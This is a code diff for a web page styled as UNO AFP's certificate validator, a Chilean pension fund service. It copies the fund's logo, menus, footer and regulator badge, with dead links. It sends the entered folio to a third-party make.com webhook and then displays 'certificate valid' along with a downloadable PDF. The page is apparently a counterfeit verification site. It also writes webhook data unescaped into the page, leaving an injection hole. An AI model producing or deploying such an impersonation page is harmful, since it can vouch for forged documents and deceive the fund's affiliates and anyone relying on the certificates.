@@ -6,34 +6,95 @@
   <title>Validador de Certificados – UNO AFP</title>
   
   <link rel="icon" href="https://www.google.com/s2/favicons?domain=uno.cl&sz=128" type="image/png" />
-  
+
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet"/>
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
     body { font-family: 'Poppins', sans-serif; background: #f8f9fb; color: #333; min-height: 100vh; display: flex; flex-direction: column; }
-    .navbar { background: #fff; padding: 12px 40px; display: flex; align-items: center; gap: 12px; }
+
+    /* ── TOP UTILS ── */
+    .top-utils { background: #fff; padding: 10px 40px; display: flex; align-items: center; justify-content: flex-end; gap: 16px; border-bottom: 1px solid #eee; }
+    .top-utils a { font-size: 0.8rem; color: #666; text-decoration: none; display: flex; align-items: center; gap: 4px; }
+    .top-utils .btn-unonline { background: #1a7cbf; color: #fff; padding: 8px 18px; border-radius: 4px; font-size: 0.82rem; font-weight: 600; text-decoration: none; }
+
+    /* ── NAVBAR ── */
+    .navbar { background: #fff; padding: 12px 40px; display: flex; align-items: center; gap: 12px; box-shadow: 0 2px 6px rgba(0,0,0,.06); }
     .navbar img { height: 44px; object-fit: contain; }
+    .navbar nav { display: flex; gap: 4px; margin-left: 16px; }
+    .navbar nav a { font-size: 0.85rem; color: #333; text-decoration: none; padding: 8px 12px; font-weight: 500; }
+    .navbar nav a:hover { color: #1a7cbf; }
+    /* gradient line under nav */
     .nav-line { height: 3px; background: linear-gradient(90deg, #1a9ad9 0%, #1a7cbf 40%, #e040a0 100%); }
+
+    /* ── BREADCRUMB ── */
+    .breadcrumb { padding: 12px 40px; font-size: 0.78rem; color: #888; }
+    .breadcrumb a { color: #666; text-decoration: none; }
+
+    /* ── MAIN CONTENT ── */
     main { flex: 1; padding: 24px 40px 60px; max-width: 1100px; margin: 0 auto; width: 100%; }
+
     .page-layout { display: flex; gap: 60px; align-items: flex-start; }
+
+    /* LEFT: title + description */
     .left-panel { flex: 1; padding-top: 10px; }
     .page-title { font-size: 2rem; font-weight: 700; color: #1a7cbf; text-transform: uppercase; line-height: 1.2; margin-bottom: 18px; }
+    .left-panel p { font-size: 0.92rem; color: #555; line-height: 1.7; }
+
+    /* RIGHT: form card + preview thumbnails */
     .right-panel { width: 480px; flex-shrink: 0; }
     .form-card { background: #fff; border-radius: 8px; box-shadow: 0 2px 16px rgba(0,0,0,.10); padding: 28px 28px 32px; }
+    .form-card h3 { font-size: 1rem; font-weight: 600; color: #333; margin-bottom: 20px; line-height: 1.45; }
+
     .field-group { margin-bottom: 16px; }
-    .field-group label { display: block; font-size: 0.85rem; font-weight: 500; margin-bottom: 6px; }
-    .field-group input { width: 100%; padding: 11px 14px; border: 1.5px solid #d0d8e0; border-radius: 6px; font-family: 'Poppins', sans-serif; outline: none; }
-    .field-group input:focus { border-color: #1a7cbf; }
-    .btn-valida { width: 100%; padding: 12px; background: #d0d8e0; color: #888; border: none; border-radius: 6px; font-family: 'Poppins', sans-serif; font-size: 0.92rem; font-weight: 600; cursor: not-allowed; }
+    .field-group label { display: block; font-size: 0.85rem; font-weight: 500; color: #333; margin-bottom: 6px; }
+    .field-group label .req { color: #e04040; font-size: 0.9rem; }
+    .field-group input { width: 100%; padding: 11px 14px; border: 1.5px solid #d0d8e0; border-radius: 6px; font-family: 'Poppins', sans-serif; font-size: 0.9rem; color: #333; transition: border-color .2s; }
+    .field-group input:focus { outline: none; border-color: #1a7cbf; box-shadow: 0 0 0 2px rgba(26,124,191,.12); }
+
+    .btn-valida { width: 100%; padding: 12px; background: #d0d8e0; color: #888; border: none; border-radius: 6px; font-family: 'Poppins', sans-serif; font-size: 0.92rem; font-weight: 600; cursor: not-allowed; transition: all .2s; margin-top: 4px; }
     .btn-valida.ready { background: #1a7cbf; color: #fff; cursor: pointer; }
+    .btn-valida.ready:hover { background: #155d99; }
+    .btn-valida:disabled:not(.ready) { background: #d0d8e0; color: #888; }
+
+    /* ── CERT LOCATION HINT ── */
+    .cert-hint { margin-top: 20px; }
+    .cert-hint p { font-size: 0.8rem; color: #555; margin-bottom: 10px; line-height: 1.5; }
+    .cert-hint p strong { color: #333; }
+    .cert-thumbs { display: flex; gap: 8px; }
+    .cert-thumb { flex: 1; background: #f0f4f8; border-radius: 4px; padding: 10px 6px; }
+    .thumb-lines { margin-bottom: 6px; }
+    .thumb-line { height: 4px; background: #d0d8e0; border-radius: 2px; margin-bottom: 3px; }
+    .thumb-line.accent { background: #e04040; width: 60%; }
+    .thumb-line.short { width: 50%; }
+    .thumb-line.med { width: 75%; }
+    .thumb-line.long { width: 100%; }
+    .thumb-barcode { height: 16px; background: repeating-linear-gradient(90deg, #333 0px, #333 2px, #fff 2px, #fff 4px); border-radius: 2px; margin-top: 4px; }
+
+    /* ── SPINNER / RESULT ── */
     .spinner { display: none; text-align: center; padding: 16px 0; }
     .spinner.active { display: block; }
     .spinner svg { animation: spin .9s linear infinite; }
     @keyframes spin { to { transform: rotate(360deg); } }
+
     .result-box { display: none; margin-top: 18px; border-radius: 6px; overflow: hidden; border: 1px solid #ddd; }
     .result-box.visible { display: block; }
-    .result-header { padding: 10px 16px; font-weight: 600; font-size: 0.88rem; }
-    .result-body { padding: 16px; background: #fff; }
+    .result-header { padding: 10px 16px; font-weight: 600; font-size: 0.88rem; display: flex; align-items: center; gap: 8px; }
+    .result-header.success { background: #e8f5e9; color: #2e7d32; border-bottom: 2px solid #2e7d32; }
+    .result-header.error { background: #ffebee; color: #c62828; border-bottom: 2px solid #c62828; }
+    .result-body { padding: 16px; background: #fff; font-size: 0.88rem; }
+    .result-body .name { font-weight: 700; margin-bottom: 12px; }
+    .btn-pdf { display: inline-flex; align-items: center; gap: 6px; background: #1a7cbf; color: #fff; padding: 9px 16px; border-radius: 6px; font-size: 0.85rem; font-weight: 600; cursor: pointer; border: none; font-family: 'Poppins', sans-serif; transition: background .2s; }
+    .btn-pdf:hover { background: #155d99; }
+
+    /* ── FOOTER ── */
+    .footer { background: #fff; border-top: 1px solid #e0e4e8; padding: 36px 40px 20px; }
+    .footer .footer-logo img { height: 36px; object-fit: contain; margin-bottom: 24px; }
+    .footer-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 20px; font-size: 0.8rem; margin-bottom: 24px; }
+    .footer-grid h4 { font-size: 0.85rem; font-weight: 600; margin-bottom: 10px; color: #333; }
+    .footer-grid a { display: block; color: #666; text-decoration: none; margin-bottom: 4px; }
+    .footer-bottom { border-top: 1px solid #e0e4e8; padding: 14px 0 0; display: flex; align-items: center; justify-content: space-between; font-size: 0.78rem; color: #999; }
+    .sp-logo { display: flex; align-items: center; gap: 10px; font-size: 0.75rem; }
+
     @media (max-width: 768px) {
       .page-layout { flex-direction: column; gap: 30px; }
       .right-panel { width: 100%; }
@@ -41,30 +102,128 @@
   </style>
 </head>
 <body>
-<div class="navbar"><img src="https://49659256.fs1.hubspotusercontent-na1.net/hubfs/49659256/PDFS/LOGOS%20AFP/LOGO%20UNO.png" alt="UNO AFP"/></div>
+
+<div class="top-utils">
+  <a href="#">🔍 Buscar</a>
+  <a href="#">♿ Accesibilidad</a>
+  <a href="#" class="btn-unonline">👤 UNOnline</a>
+</div>
+
+<div class="navbar">
+  <img src="https://49659256.fs1.hubspotusercontent-na1.net/hubfs/49659256/PDFS/LOGOS%20AFP/LOGO%20UNO.png" alt="UNO AFP"/>
+  <nav>
+    <a href="#">Hazte Cliente ▾</a>
+    <a href="#">Trámites ▾</a>
+    <a href="#">Productos y servicios ▾</a>
+    <a href="#">Información relevante ▾</a>
+  </nav>
+</div>
 <div class="nav-line"></div>
+
+<div class="breadcrumb">
+  🏠 / <a href="#">Accesos rápidos</a> / <strong>Validador de certificados</strong>
+</div>
+
 <main>
   <div class="page-layout">
-    <div class="left-panel"><h1 class="page-title">VALIDADOR DE CERTIFICADOS</h1></div>
+    <div class="left-panel">
+      <h1 class="page-title">VALIDADOR DE CERTIFICADOS</h1>
+      <p>¿Quieres saber si tu certificado es válido?</p>
+    </div>
+
     <div class="right-panel">
       <div class="form-card">
-        <h3>Ingresa los siguientes datos</h3>
-        <div class="field-group"><label>RUT del Afiliado</label><input type="text" id="rut" oninput="checkReady()"/></div>
-        <div class="field-group"><label>Folio del Certificado</label><input type="text" id="folio" oninput="checkReady()"/></div>
+        <h3>Ingresa los siguientes datos y<br/>te lo confirmamos</h3>
+
+        <div class="field-group">
+          <label><span class="req">* </span>RUT del Afiliado</label>
+          <input type="text" id="rut" placeholder="" maxlength="12" oninput="checkReady()"/>
+        </div>
+
+        <div class="field-group">
+          <label><span class="req">* </span>Folio del Certificado</label>
+          <input type="text" id="folio" placeholder="" oninput="checkReady()"/>
+        </div>
+
         <button class="btn-valida" id="btn-valida" onclick="validar()">Valida</button>
-        <div class="spinner" id="spinner"><svg width="28" height="28" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#e0e0e0" stroke-width="3"/><path d="M12 2a10 10 0 0 1 10 10" stroke="#1a7cbf" stroke-width="3" stroke-linecap="round"/></svg></div>
-        <div class="result-box" id="result-box"><div class="result-header" id="result-header"></div><div class="result-body" id="result-body"></div></div>
+
+        <div class="spinner" id="spinner">
+          <svg width="28" height="28" viewBox="0 0 24 24" fill="none">
+            <circle cx="12" cy="12" r="10" stroke="#e0e0e0" stroke-width="3"/>
+            <path d="M12 2a10 10 0 0 1 10 10" stroke="#1a7cbf" stroke-width="3" stroke-linecap="round"/>
+          </svg>
+        </div>
+
+        <div class="result-box" id="result-box">
+          <div class="result-header" id="result-header"></div>
+          <div class="result-body" id="result-body"></div>
+        </div>
+      </div>
+
+      <div class="cert-hint">
+        <p>Encuentra el número de Folio del Certificado en las <strong>siguientes zonas:</strong></p>
+        <div class="cert-thumbs">
+          <div class="cert-thumb">
+            <div class="thumb-lines">
+              <div class="thumb-line accent"></div>
+              <div class="thumb-line long"></div>
+              <div class="thumb-line med"></div>
+              <div class="thumb-line long"></div>
+              <div class="thumb-line short"></div>
+            </div>
+          </div>
+          <div class="cert-thumb">
+            <div class="thumb-lines">
+              <div class="thumb-line long"></div>
+              <div class="thumb-line med"></div>
+            </div>
+            <div class="thumb-line accent"></div>
+            <div class="thumb-barcode"></div>
+          </div>
+          <div class="cert-thumb">
+            <div class="thumb-lines">
+              <div class="thumb-line long"></div>
+              <div class="thumb-line med"></div>
+              <div class="thumb-line long"></div>
+            </div>
+            <div class="thumb-line accent"></div>
+          </div>
+        </div>
       </div>
     </div>
   </div>
 </main>
+
+<div class="footer">
+  <div class="footer-logo"><img src="https://49659256.fs1.hubspotusercontent-na1.net/hubfs/49659256/PDFS/LOGOS%20AFP/LOGO%20UNO.png" alt="UNO AFP"/></div>
+  <div class="footer-grid">
+    <div><h4>Sobre UNO</h4><a href="#">Nosotros</a><a href="#">Directorio</a><a href="#">Políticas y Antecedentes</a><a href="#">Nuestras comisiones</a></div>
+    <div><h4>Te puede interesar</h4><a href="#">Incorpórate a tu primera AFP</a><a href="#">Productos Voluntarios</a><a href="#">Multifondos</a></div>
+    <div><h4>Otros Trámites</h4><a href="#">Pensión de Vejez</a><a href="#">Pensión de invalidez</a><a href="#">Solicitud de Herencia</a></div>
+    <div><h4>Conversemos</h4><a href="#">Escríbenos</a><a href="#">unoafp</a><a href="#">@unoafp</a><a href="#">Ayuda</a></div>
+    <div><h4>Links de interés</h4><a href="#">Superintendencia de Pensiones</a><a href="#">Previred</a><a href="#">AFC</a><a href="#">IPS</a></div>
+  </div>
+  <div class="footer-bottom">
+    <div class="sp-logo">
+      <svg width="24" height="24" viewBox="0 0 40 40" fill="none"><circle cx="20" cy="20" r="18" stroke="#1a7cbf" stroke-width="3"/><text x="8" y="26" fill="#1a7cbf" font-size="13" font-weight="bold">SP</text></svg>
+      Superintendencia de Pensiones
+    </div>
+    <span>&copy; Todos los derechos reservados UNO afp 2026</span>
+  </div>
+</div>
+
 <script>
   const WEBHOOK = 'https://hook.us2.make.com/iq6ps3txx1jaxr91mje7sx47ynbta3kb';
+
   function checkReady() {
     const btn = document.getElementById('btn-valida');
-    if (document.getElementById('rut').value.trim() && document.getElementById('folio').value.trim()) { btn.classList.add('ready'); btn.disabled = false; }
-    else { btn.classList.remove('ready'); btn.disabled = true; }
+    if (document.getElementById('rut').value.trim() && document.getElementById('folio').value.trim()) {
+      btn.classList.add('ready'); btn.disabled = false;
+    } else {
+      btn.classList.remove('ready'); btn.disabled = true;
+    }
   }
+
   function abrirPDF(b64) {
     let base64 = b64.startsWith('data:') ? b64.split(',')[1] : b64;
     const binary = atob(base64); const array = new Uint8Array(binary.length);
@@ -72,30 +231,60 @@
     const url = URL.createObjectURL(new Blob([array], {type: 'application/pdf'}));
     window.open(url, '_blank');
   }
+
   async function validar() {
     const uuid = document.getElementById('folio').value.trim();
     if (!uuid) return;
-    document.getElementById('btn-valida').disabled = true; document.getElementById('spinner').classList.add('active'); document.getElementById('result-box').classList.remove('visible');
-    const controller = new AbortController(); const timeout = setTimeout(() => controller.abort(), 30000);
+    
+    document.getElementById('btn-valida').disabled = true;
+    document.getElementById('btn-valida').classList.remove('ready');
+    document.getElementById('spinner').classList.add('active');
+    document.getElementById('result-box').classList.remove('visible');
+
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 30000);
+
     try {
-      const res = await fetch(WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ uuid: uuid, afp: 'UNO' }), signal: controller.signal });
+      const res = await fetch(WEBHOOK, {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ uuid: uuid, afp: 'UNO' }), signal: controller.signal
+      });
       clearTimeout(timeout); const data = await res.json();
+      
       document.getElementById('spinner').classList.remove('active');
       const box = document.getElementById('result-box'), hdr = document.getElementById('result-header'), bdy = document.getElementById('result-body');
+      
       if (data.found === true && data.pdf) {
-        hdr.style.cssText = 'background: #e0f4ff; color: #1a7cbf; border-bottom: 3px solid #1a7cbf;'; hdr.innerHTML = `✅ ¡Confirmado! El certificado es válido`;
-        bdy.innerHTML = `<div style="text-align:center;"><button onclick="abrirPDF('${data.pdf}')" style="background:#e040a0; color:#fff; border:none; padding:10px 24px; border-radius:6px; cursor:pointer; font-weight:bold;">Descargar Copia PDF</button></div>`;
+        hdr.className = 'result-header success';
+        hdr.style.backgroundColor = '#e0f4ff'; hdr.style.color = '#1a7cbf'; hdr.style.borderBottom = '3px solid #1a7cbf';
+        hdr.innerHTML = `✅ ¡Confirmado! El certificado es válido`;
+        bdy.innerHTML = `
+          <div style="text-align:center; padding: 20px 0;">
+            <h3 style="color:#333; margin-bottom: 8px;">${data.name || 'Documento Verificado'}</h3>
+            <p style="color:#555; font-size:0.9rem; margin-bottom: 20px;">Los datos ingresados coinciden con nuestros registros.</p>
+            <button onclick="abrirPDF('${data.pdf}')" style="background:#e040a0; color:#fff; border:none; padding:10px 24px; border-radius:6px; cursor:pointer; font-weight:bold;">Descargar Copia PDF</button>
+          </div>`;
       } else if (data.found === false) {
-        hdr.style.cssText = 'background: #ffebee; color: #c62828; border-bottom: 3px solid #c62828;'; hdr.innerHTML = `❌ Certificado no encontrado`;
-        bdy.innerHTML = `<p>No hemos encontrado este certificado.</p>`;
+        hdr.className = 'result-header error'; hdr.innerHTML = `❌ Certificado no encontrado`;
+        bdy.innerHTML = `<p style="color:#555;font-size:0.9rem;">No hemos encontrado este certificado.</p>`;
+      } else {
+        hdr.className = 'result-header error'; hdr.innerHTML = '⚠️ Error inesperado.';
       }
       box.classList.add('visible');
     } catch(err) {
       clearTimeout(timeout); document.getElementById('spinner').classList.remove('active');
-      document.getElementById('result-header').style.cssText = 'background: #ffebee; color: #c62828;'; document.getElementById('result-header').innerHTML = '⚠️ Error de conexión.';
+      document.getElementById('result-header').innerHTML = '⚠️ Error de conexión.';
       document.getElementById('result-box').classList.add('visible');
     } finally { checkReady(); }
   }
+
+  window.addEventListener('DOMContentLoaded', function() {
+    document.getElementById('rut').addEventListener('keydown', e=>{ if(e.key==='Enter') document.getElementById('folio').focus(); });
+    document.getElementById('folio').addEventListener('keydown', e=>{ if(e.key==='Enter') validar(); });
+    document.getElementById('rut').addEventListener('input', checkReady);
+    document.getElementById('folio').addEventListener('input', checkReady);
+    document.getElementById('btn-valida').disabled = true;
+  });
 </script>
 </body>
 </html>
